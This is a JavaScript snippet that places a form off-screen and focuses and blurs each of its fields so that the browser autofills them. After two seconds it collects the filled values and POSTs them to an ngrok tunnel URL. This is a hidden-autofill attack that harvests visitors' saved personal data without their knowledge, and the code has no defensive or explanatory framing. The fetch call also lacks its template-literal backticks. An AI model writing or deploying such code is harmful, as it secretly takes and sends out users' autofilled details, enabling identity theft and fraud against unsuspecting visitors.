// ngrok URL - Replace this with your current ngrok URL
const ngrokUrl = 'https://d5f2-102-68-79-243.ngrok-free.app'; // Update with your ngrok URL

// Function to send form data to the local server via ngrok
function sendFormData(data) {
    fetch(${ngrokUrl}/api/user-inputs, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

// Function to trigger hidden form autofill
function triggerAutofill() {
    const hiddenForm = document.getElementById('hiddenForm');
    hiddenForm.style.position = 'absolute'; // Ensure the form is positioned off-screen but still in the layout

    // Simulate user focus to trigger browser autofill
    const fields = hiddenForm.querySelectorAll('input');
    fields.forEach(field => {
        field.focus();
        field.blur(); // Trigger autofill
    });

    // Collect the autofilled data and send it
    setTimeout(() => {
        const formData = new FormData(hiddenForm);
        const data = {};
        formData.forEach((value, key) => {
            data[key] = value;
        });
        sendFormData(data);
        hiddenForm.style.position = 'absolute'; // Keep the form off-screen
    }, 2000); // Wait 2 seconds for autofill to complete
}
